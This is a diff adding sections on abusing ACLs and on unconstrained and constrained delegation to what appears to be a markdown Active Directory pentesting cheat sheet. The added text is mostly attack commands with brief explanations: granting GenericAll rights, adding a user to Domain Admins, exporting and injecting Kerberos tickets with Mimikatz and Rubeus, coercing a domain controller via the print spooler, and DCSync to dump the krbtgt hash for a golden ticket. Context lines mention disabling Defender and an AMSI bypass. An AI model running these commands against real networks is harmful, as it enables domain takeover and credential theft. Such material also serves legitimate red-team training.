@@ -12,6 +12,9 @@
   - [Domain-Enumeration](#domain-enumeration-commands)
   - [BloodHound](#bloodHound)
   - [Lateral Movement](#lateral-movement)
+    - [Abuse ACLs]
+    - [Constrained Delegation]
+    - [Unconstrained Delegation]
   - [Domain Persistence](#bloodHound)
     - [DCsync Attack]
     - [Diamond Ticket]
@@ -21,10 +24,7 @@
     - [Custom SSP]
   - [Domain Privilege Escalation](#bloodHound)
     - [Kerberoasting]
-    - [Constrained Delegation]
-    - [Unconstrained Delegation]
   - [Enterprise Admin Escalation and Forest Trust Abuse](#bloodHound)
-  - [Lateral Movement](#bloodHound)
 - [Living off the land](#living-off-the-land)
   - [Active Directory Built in Commands](#ad-enumeration)
 
@@ -134,6 +134,8 @@ Check for Interesting ACLs with modify rights. GenericWrite GenericALL
 Check for Interesting ACLs on a group instead of a user
 `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "group"}`
 
+
+
 ### Domains and Trusts 
 List all domains in the current Forest: 
 `Get-ForestDomain -Verbose`
@@ -192,7 +194,77 @@ Copy/paste AMSI bypass into the tagret powershell
 `Set-MpPreference -DisableRealtimeMonitoring $true`
 
 ### Permissive Policy Checks  
-`reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script
+`reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script`
+
+### Abuse ACLS 
+GenericAll 
+
+#### Assign GenericAll rights onto a target that we have WriteDACL permissions on: 
+Add-DomainObjectACL -TargetUsername -PrincipalIdentity Attackers-Username -Rights All 
+
+#### Overwrite a users password
+net user <username> <password> /domain 
+
+#### Add yourself to a group 
+net group "Domain Admins" <username> /add /domain
+
+### Unconstrained Delegation
+Forwardable TGT.  
+Target service can request access on behalf of the user access to other services. 
+If a user connects to a service that has unconstrained delegation enabled, tha user and associated TGT can be compromised.
+
+#### Searching for Trusted_For_Delegation rights
+`Get-DomainComputer -Unconstrained` 
+
+Pull info about tickets on that machine with Mimikatz
+`sekurlsa::tickets`   
+Export Tickets add `/export`  
+
+Add the ticket to the session.
+`kerberos::ptt tgt.kirbi`
+
+Access other machines with the TGT now in memory.
+
+#### Print Spool Exploit 
+Getting a DC to connect back to us.  
+On a compromised host with unconstrained delgation. Run Rubeus in monitor mode to capture the DC machine account TGT  
+`rubeus.exe monitor /interval:5 /filteruser:DC$`  
+
+Separate cmd, issue printspool expoit.
+`Spool.exe Target-DC Capture-Server`
+
+Use Rubeus to inject the TGT into memory.
+`rubeus.exe ptt /ticket:base64...`
+
+Perform actions as the user with that TGT we got.  
+The DC machine account is not a local admin. We can do DCSYNC attacks, however.  
+Replicate the DC and dump the creds for any user we want.  
+
+Mimikatz 
+`lsadump::dcsync /domain:domain.corp /user:domain\krbtgt`
+
+Use the krbtgt hash to create a golden ticket...
+
+### Constrained Delegation
+Unconstrained allows the service to authenticate to anything in the domain.
+Constrained limits to specific service.  
+
+S4U2Self
+- User authenticates not using kerberos auth. The service on behalf of the user requests a TGS against the KDC.
+- It does this without requiring the password of the user.
+- Compromised server with constrained delegation means we can request a TGS to the specific service for any user in the domain!
+
+S4u2Proxy  
+
+`msds-AllowedToDelegateTo`
+
+Constrained delegation is only allowed for the specified user to a particular service.  
+
+#### Searching for TrustedToAuth rights  
+Enumerate constrained delegation to see what users have constrained delgation to which services.  
+`Get-DomainUser -TrustedToAuth`  
+
+
 
 ---
 
